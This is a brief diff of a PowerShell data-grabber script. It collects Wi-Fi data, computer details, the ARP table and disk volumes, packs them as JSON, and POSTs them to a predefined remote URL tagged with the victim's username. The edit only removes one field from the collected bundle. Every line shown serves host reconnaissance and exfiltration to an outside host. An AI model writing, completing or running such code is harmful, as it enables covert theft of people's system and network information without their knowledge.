@@ -4,5 +4,5 @@ $wifi = @{}
 $info = Get-ComputerInfo | ConvertTo-Json | ConvertFrom-Json 
 $net = arp -a 
 $vol = Get-Volume
-$data = New-Object -TypeName psobject -Property @{"wifi" = $wifi; "local" = $local; "net" = $net ; "info" = $info; "Volume" = $vol} | ConvertTo-Json
+$data = New-Object -TypeName psobject -Property @{"wifi" = $wifi; "net" = $net ; "info" = $info; "Volume" = $vol} | ConvertTo-Json
 Invoke-RestMethod $url/$(whoami) -Method Post -Body $data #$url is predefined
